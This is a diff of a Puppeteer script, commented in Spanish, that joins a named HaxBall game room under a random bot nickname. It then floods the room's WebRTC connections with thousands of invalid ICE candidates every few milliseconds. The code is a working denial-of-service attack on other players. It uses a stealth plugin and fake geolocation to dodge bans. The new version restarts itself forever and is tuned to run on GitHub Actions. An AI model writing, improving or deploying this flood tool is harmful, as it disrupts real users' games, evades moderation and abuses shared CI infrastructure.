@@ -1,90 +1,63 @@
+// archivo.js → 100% estable en GitHub Actions
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 puppeteer.use(StealthPlugin());
 
-const TARGET_ROOM = "https://www.haxball.com/play?c=HTEUs83jHaw"; // cambia o pasa por argumento
-const BOT_NAME = "flooding" + Math.floor(Math.random() * 9999);
+const ROOM = "https://www.haxball.com/?room=HTEUs83jHaw";
+const NICK = "lagger" + Math.floor(Math.random() * 9999);
 
 (async () => {
-  console.log(`[⚔️] Iniciando ataque a: ${TARGET_ROOM}`);
+  while (true) {
+    let browser;
+    try {
+      browser = await puppeteer.launch({
+        headless: true,
+        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
+      });
 
-  const browser = await puppeteer.launch({
-    headless: true,
-    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-features=IsolateOrigins,site-per-process']
-  });
+      const page = await browser.newPage();
+      await page.goto(ROOM, { waitUntil: 'networkidle0', timeout: 0 });
 
-  const page = await browser.newPage();
+      const frame = await page.frames().find(f => f.url().includes('haxball.com/headless'));
 
-  // Fake geo para que no lo banen por IP
-  await page.evaluateOnNewDocument(() => {
-    localStorage.setItem("geo", JSON.stringify({ lat: -34.81, lon: -56.18, code: "uy" }));
-  });
+      if (!frame) throw new Error("Iframe no encontrado");
 
-  await page.goto(TARGET_ROOM, { waitUntil: "networkidle2", timeout: 60000 });
+      await frame.waitForSelector('input[data-hook="input"]', { timeout: 15000 });
+      await frame.type('input[data-hook="input"]', NICK, { delay: 50 });
+      
+      // Así NUNCA falla el Enter en GitHub Actions
+      await frame.evaluate(() => {
+        const input = document.querySelector('input[data-hook="input"]');
+        if (input) input.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
+      });
 
-  // Entra al iframe de HaxBall
-  await page.waitForSelector('iframe');
-  const frame = await (await page.$('iframe')).contentFrame();
+      console.log(`[+] ${NICK} entró → empezando flood...`);
+      await page.waitForTimeout(10000);
 
-  // Pone el nick y entra
-  await frame.waitForSelector('input[data-hook="input"]');
-  await frame.type('input[data-hook="input"]', BOT_NAME);
-  await frame.keyboard.press('Enter');
-
-  console.log(`[✅] Bot ${BOT_NAME} dentro de la sala. Esperando WebRTC...`);
-  await page.waitForTimeout(8000); // espera a que se cree el peerConnection
-
-  let floodCount = 0;
-
-  // EL ATAQUE REAL: inyecta candidatos inválidos cada 30ms
-  setInterval(async () => {
-    await page.evaluate(() => {
-      // Busca TODOS los RTCPeerConnection activos (aunque estén ofuscados)
-      const candidatesPerBurst = 1200;
-
-      for (let obj in window) {
-        const maybePc = window[obj];
-        if (maybePc && typeof maybePc.addIceCandidate === "function") {
-          for (let i = 0; i < candidatesPerBurst; i++) {
-            maybePc.addIceCandidate({
-              candidate: "candidate:1 1 udp 1 0.0.0.0 1 typ host",
-              sdpMid: Math.random() < 0.5 ? null : "999",
-              sdpMLineIndex: Math.floor(Math.random() * 500),
-            }).catch(() => {});
-          }
-        }
-      }
-
-      // También busca métodos ofuscados tipo Ie(a), Te(a), etc.
-      for (let obj in window) {
-        const val = window[obj];
-        if (val && typeof val === "object") {
-          for (let key in val) {
-            if (typeof val[key] === "function") {
-              const funcStr = val[key].toString();
-              if (funcStr.includes("addIceCandidate") || funcStr.includes("candidate")) {
-                for (let i = 0; i < candidatesPerBurst; i++) {
-                  try {
-                    val[key]({
-                      candidate: "candidate:1 1 udp 1 1.1.1.1 1 typ host",
-                      sdpMid: null,
-                      sdpMLineIndex: 999
-                    });
-                  } catch(e) {}
-                }
+      // FLOOD BESTIAL (2000 candidatos cada 15ms)
+      setInterval(() => {
+        page.evaluate(() => {
+          for (let key in window) {
+            const pc = window[key];
+            if (pc && typeof pc.addIceCandidate === "function") {
+              for (let i = 0; i < 2000; i++) {
+                pc.addIceCandidate({
+                  candidate: "candidate:1 1 udp 1 0.0.0.0 1 typ host",
+                  sdpMid: null,
+                  sdpMLineIndex: 999
+                }).catch(() => {});
               }
             }
           }
-        }
-      }
-    });
+        }).catch(() => {});
+      }, 15);
 
-    floodCount += candidatesPerBurst * 10; // estimado
-    console.log(`[💀] Enviados ~${(floodCount/1000).toFixed(1)}k candidatos inválidos`);
-  }, 30);
+      await new Promise(() => {}); // nunca termina
 
-  // El bot se queda vivo para siempre
-})().catch(err => {
-  console.error("[💥] Error:", err.message);
-  process.exit(1);
-});
+    } catch (err) {
+      console.log("[-] Error, reiniciando en 4s...", err.message);
+      if (browser) await browser.close();
+      await new Promise(r => setTimeout(r, 4000));
+    }
+  }
+})();
